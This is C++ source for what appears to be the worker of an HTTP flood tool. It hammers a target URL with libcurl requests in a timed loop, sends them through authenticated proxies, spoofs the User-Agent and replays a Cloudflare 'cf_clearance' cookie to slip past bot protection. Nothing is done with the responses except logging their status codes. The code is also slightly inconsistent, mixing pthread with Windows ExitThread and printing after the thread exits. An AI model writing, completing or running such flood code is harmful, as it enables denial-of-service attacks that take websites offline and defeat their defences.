#include <string>
#include <curl/curl.h>
#include <condition_variable>
#include <iostream> 
#include <string>
#include <format>
#include <pthread.h>
#include <stop_token>




size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    ((std::string*)userp)->append(static_cast<char*>(contents), realsize);
    return realsize;
}
void performCurlRequest(const int time,const std::string& url, const std::string& proxy, const std::string& proxyAuth, const std::string& ua, const std::string& cookie) {
    auto start_time = std::chrono::steady_clock::now();

    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    std::cout << "Starting";
    try {
    if (curl) {
            while (true) {
                struct curl_slist* headers = NULL;
                headers = curl_slist_append(headers, std::format("User-Agent: {}", ua).c_str());
                if (cookie != "") {
                    headers = curl_slist_append(headers, std::format("Cookie: cf_clearance={}", cookie).c_str());
                }
                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
                curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
                curl_easy_setopt(curl, CURLOPT_PROXYUSERPWD, proxyAuth.c_str());
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
                try {
                    res = curl_easy_perform(curl);
                }
                catch (std::exception& e) {
                    std::cout << "exception: " << e.what() << std::endl;
                }
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                std::cout << "Bad: " << response_code << std::endl;

                curl_slist_free_all(headers);
                if (std::chrono::steady_clock::now() - start_time >= std::chrono::seconds(time)) {
                    break;
                }
            }

            curl_easy_cleanup(curl);
            curl_global_cleanup();
        }
       
        
     
    
    }
    catch (std::exception& e) {
        std::cout << "exception: " << e.what() << std::endl;
    }
    ExitThread(1);
    std::cout << "Breakeddded";
    
}

